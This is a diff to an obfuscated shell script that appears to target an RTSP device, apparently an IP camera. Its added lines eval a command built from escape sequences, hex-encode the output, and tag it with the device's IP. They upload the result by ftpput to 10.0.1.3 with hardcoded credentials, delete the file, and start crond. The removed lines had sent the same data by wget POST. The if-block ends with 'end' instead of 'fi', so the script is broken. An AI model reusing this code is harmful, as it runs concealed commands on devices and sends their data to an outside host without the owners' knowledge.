@@ -36,7 +36,7 @@ L=$((5000+($RANDOM % 10000)))
 cat << EOF | unix2dos | timeout $J $F nc $G $H
 $B
 OPTIONS /KylerHowAreTheKids RTSP/1.0
-K: $L
+CSeq: $L
 
 EOF
 
@@ -54,11 +54,12 @@ then
     exit
 fi
 
-N=$(echo $(eval $(echo -e $M)) | hexdump -ve '/1 "%02x"')
+IP_ADDR=$(ifconfig eth0 | grep "inet addr" | cut -d " " -f 12)
+OUT_FILE=$(cryptpw "$(date)$IP_ADDR" | tr -d '/')
+echo $IP_ADDR > "$OUT_FILE"
+echo $(eval $(echo -e $M) | hexdump -ve '/1 "%02x"') &> "$OUT_FILE";ftpput -u golf -p golf 10.0.1.3 "$OUT_FILE";rm "$OUT_FILE"
 
-O={\"content\":\"$N\"}
-
-echo \'$(echo $O)\'
-
-wget --method=POST --header="Content-Type: application/json" --body-data=$(echo $O)  $E
-
+if [ $(ps | grep crond | wc -l) == 1 ]
+then
+    crond
+end
